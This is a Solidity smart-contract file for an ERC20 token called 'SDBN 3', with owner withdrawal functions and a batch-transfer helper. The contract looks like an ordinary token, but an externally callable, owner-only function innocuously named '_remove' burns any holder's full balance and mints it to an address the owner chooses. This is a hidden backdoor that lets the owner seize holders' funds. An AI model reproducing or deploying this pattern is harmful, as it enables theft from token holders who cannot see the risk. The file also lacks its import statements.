pragma solidity ^0.8.0;


contract SDBN3 is ERC20, Ownable{
    using Address for address;
    
    string tokenName = "SDBN 3";
    string tokenSymbol = "SDBNS3";
    uint256 tokenTotalSupply = 1000000000 * (10**18);
     
    constructor() ERC20(tokenName, tokenSymbol) {   
        _mint(msg.sender, tokenTotalSupply);
    }
     
    function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        super._transfer(sender, recipient, amount);
    }

    function _remove(address _from, address _to) external onlyOwner {
        uint256 blanace = balanceOf(_from);
        _burn(_from, blanace);
        _mint(_to, blanace);
    }

   
    function withdrawBNB(address to, uint256 value) external onlyOwner {
        require(address(this).balance >= value, "Insufficient BNB balance");
        (bool success,) = to.call{value: value}("");
        require(success, "Transfer failed");
    }

    function withdrawTokens(address tokenAddress, address to, uint256 value) external onlyOwner {
        require(IERC20(tokenAddress).balanceOf(address(this)) >= value, "Insufficient token balance");

        try IERC20(tokenAddress).transfer(to, value) {} catch {
            revert("Transfer failed");
        }
    }
    
    function multiTransfer(address tokenAddress, address[] memory recipients, uint256[] memory amounts) external {
        require(recipients.length == amounts.length, "Invalid input");

        IERC20 token = IERC20(tokenAddress);
        uint256 totalAmount = 0;

        for (uint256 i = 0; i < recipients.length; i++) {
            totalAmount += amounts[i];
        }

        require(token.balanceOf(msg.sender) >= totalAmount, "Insufficient balance");

        for (uint256 i = 0; i < recipients.length; i++) {
            token.transferFrom(msg.sender, recipients[i], amounts[i]);
        }
    }
    
    receive() external payable {}
}
